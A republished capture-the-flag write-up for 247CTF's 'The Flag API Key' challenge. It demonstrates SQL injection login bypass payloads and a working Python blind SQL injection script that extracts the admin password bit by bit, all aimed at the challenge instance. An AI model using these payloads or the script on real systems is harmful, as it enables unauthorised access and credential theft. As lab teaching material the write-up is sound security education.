# :game_die: Medium

> **Original Source:** [Medium](https://infosecwriteups.com/the-flag-api-key-247ctf-solution-writeup-aa3764baadcb)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# The Flag API Key — 247CTF solution writeup


Hello guys, I am Adithya M S, a guy passionate about exploring hidden endpoints in web services and trying to dig deep into them. This is another article in my series of writeups based on Capture the Flag security challenges **247CTF**


In this writeup, we are going to look at the challenge **The Flag API Key** from **247CTF**


By the way, if you don’t know what an API is, it is in short an application or library that acts as a programming interface for users/applications to communicate with other applications. If you want to learn more about APIs, there are other awesome blogs on medium.com itself and other websites that you may look up


Let us first create our own instance of this challenge by logging into **247ctf.com** and selecting the web section, after which we look for **The Flag API Key** and select it. Now click on the“Start Challenge” button to start a new instance. This is a classic API hacking challenge using SQL injection techniques. I shall explain my strategy in great detail in this blog.


The URL of our instance is [https://e1dd780dc852441c.247ctf.com/](https://e1dd780dc852441c.247ctf.com/)(Please start your own instance of the challenge as I shall stop this instance after finishing this blog)


*Documentation page for the API given in the challenge*


The above is the documentation page of this API. It has three endpoints namely **/api/get_flag**, **/api/login** and **/api/get_token**


We can send a **GET** request to **/api/get_token** to request a token that is valid for 128 login requests.


With 128 login request we have to crack an admin password which is 32-hex long. If we **CANNOT** crack it, we would have to get a new token which would reset the admin password.


After cracking the correct admin password, we send a **POST** request to **/api/get_flag **with the password as a parameter so that we can get the flag in the response


I hope the goal and overall workflow of this challenge is clear to all.


We need to crack the password of the username admin (The **ONLY** user of this application), If there were other users, we would simply check the concatenation of username and password and check its prefix. But with my experience of solving this challenge there is ONLY the admin user for thsi API.


With this in mind let’s jump straight into it by starting Postman tool.


**What is Postman ? (If you don’t know yet)**


Postman is a versatile API client that facilitates the creation, testing, sharing, and documentation of APIs. Developers can use it to send requests, examine responses, and automate testing processes, making API development and management more efficient (In short, it provides us with various features to make HTTP requests with various methods to web services and retreive data)


If it is still not clear, you may read this blog [https://www.geeksforgeeks.org/introduction-postman-api-development/#:~:text=Postman:%20Postman%20is%20an%20API,like%20JavaScript%2C%20and%20Python](https://www.geeksforgeeks.org/introduction-postman-api-development/#:~:text=Postman:%20Postman%20is%20an%20API,like%20JavaScript%2C%20and%20Python)).


Ok, with that out of the way, let us start the Postman tool


*Postman screenshot of GET request to /api/get_token*


Above you may observe screenshot of a token request sent through Postman. The login token we have obtained is **5f360d3c8802465815b97d41f425b99a**


Let’s try using this token to login to/with the API.


*POST request to /api/login*


Note here that we are using the token obtained in the previous step in the api parameter of the **POST** request to **/api/login**


We get a response saying that the username and password are invalid.


Now what ? How can you get a 32 character password like this ? Through brute force ? It would like a lifetime right ?


The key here is to guess that the API makes use of an SQL database to query for a matching record with the username and password. What if there is a flaw in forming this query using user input directly ?


Let us try putting **admin’ OR 1=1; —** for the username and put any random string for the password..


*Putting admin’ OR 1=1;— for the username*


Wow!! our guess worked. The condition 1=1 is make part of the query and we get a success message. Also the — comments out the rest of the query and the password check is skipped.


What if we try 1=2 ? We still get a success message because the user **admin** exists in the database table. Now try changing it to **admin1' OR 1=2; —**


*POST request with username admin1' OR 1=2; —*


Now we get an invalid username and password message as there is no user named admin1 and 1=2 is also false.


## Get Adithya M S’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Now try **admin1' OR 1=1; —**


*POST request with username admin1' OR 1=1; —*


We again get a success message as 1=1 condition is true which is in OR and the password check is skipped and we put — at the end of the username and the password check in the query is concatenated after the username condition.


What if we put an extraneous quote in the query ?


*SQLite error from the API response*


We get a SQLite error. All this behaviour confirms that the API endpoints use user input directly in the SQL queries leading to SQL injection.


What do we see ? Based on the TRUE or FALSE value of the OR condition, we get different responses. Each such response indicates a YES or a NO for the condition we pose. This variant of SQL injection is called **Blind SQL injection** as we do not see the output of the query directly but get ONLY differential responses based on part of the query…


We get “result” : “success” in the response if it is TRUE and “result”: “invalid” if it is FALSE


Now each such YES or NO answer gives us 1 bit of information about the password.


The password to be guessed has 32-hex characters and each hex character has 16 possibilites. So there are 16³² = 2¹²⁸ possible passwords for the **admin** user.


We need atleast 128 requests to crack this password with YES or NO information


We CAN make ONLY 128 login requests with a single token after which the admin password would be reset.


So, due to these conditions, we would have to get 1 bit of information about the admin password with each request (which is the max we really can)


For each character of the password, we need 4 requests (remember that each hex digit can be represented by four binary digits) Based on this bimary representation, we check the following …


ONE to check whether the 1st bit is 0 or 1 (char in [‘8’, ‘9’, ‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’] would mean that the bit is 1)


ONE to check whether the 2nd bit is 0 or 1 (char in [‘4’, ‘5’, ‘6’, ‘7’, ‘c’, ‘d’, ‘e’,‘f’] would mean that the bit is 1)


ONE to check whether the 3rd bit is 0 or 1 (char in [‘2’, ‘6’, ‘a’, ‘e’, ‘3’, ‘7’, ‘b’, ‘f’] would mean that the bit is 1)


ONE to check whether the 4th bit is 0 or 1 (char in [‘1’, ‘3’, ‘5’, ‘7’, ‘9’, ‘b’, ‘d’, ‘f’] would mean that this bit is 1)


With 4 such queries we get one character and for 32 such characters we need exactly 128 queries, completing our challenge..


This is a tedious task to do manually. We have a Python program to implement our strategy.


```
import requests
import os

DOMAIN = os.getenv("247CTF_DOMAIN")

token = requests.get(f"https://{DOMAIN}.247ctf.com/api/get_token").json()['message'][-33:-1]
print(token, len(token))
recovered_password = ''

for i in range(32):
data = ["('8', '9', 'a', 'b', 'c', 'd', 'e', 'f')", "('4', '5', '6', '7', 'c', 'd', 'e', 'f')",
"('2', '6', 'a', 'e', '3', '7', 'b', 'f')", "('1', '3', '5', '7', '9', 'b', 'd', 'f')"]
for h in range(4):
form = {'username': f"admin' AND SUBSTR(password, {i+1}, 1) IN {data[h]};--", 'password': 'p', 'api': token}
msg = requests.post(f"https://{DOMAIN}.247ctf.com/api/login", data=form).json()['message'].lower()
if msg.startswith("sqlite"):
raise Exception("Change your exploit code.. Something is wrong!!")
bit = '1' if msg.startswith('welcome') else '0'
recovered_password += bit
print(f"Recovered password till now is: {hex(int(recovered_password, 2))[2:]}")
```


It is a common practice to use the same column names in SQL tables as paramter names in the API.


Even if not there are techniques to extract information (YES or NO answers) from meta tables of the database system using EXISTS conditons and get table names and column names to use in our attack. We can also use a recursive algorithm to enumerate all tables and columns of a table through Blind SQL techniques. It’s a bit complicated and I shall discuss it on a future blog post if you guys are interested. Please respond to the story with “**blind sql enumeration**” if you are interested.


Anyway here our job has been made simplified.


So to check character i of admin password we use **SUBSTR(password, i+1, 1)**


We check here that the message part of the response JSON starts with **welcome **which indicates that our query returns atleast one record and that the OR condition holds TRUE


To get this character completely, we need 4 requests checking memebership in each of those lists. With the result of each such request we construct the binary encoding of this hex character.


The nested loops run 32 * 4 = 128 times with 4 requests per character, extracting the entire password.


Before all this, notice that we first store the token used to make all these login requests..


Let’s now see this in action


*Output of our Python Blind SQL script*


Now with the obtained password, we simply send a **POST** request to **/api/get_flag** endpoint with password as a parameter to finally get the admin flag.


*Finally obtained admin flag*


I have censored the flag to avoid copyright issues. Please have fun solving this challenge on your own to get the flag !! Happy Hacking !


Please give me as many👏 as you can if you liked my blog and please follow me for more such articles.

---

*Originally published on [Medium](https://infosecwriteups.com/the-flag-api-key-247ctf-solution-writeup-aa3764baadcb). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
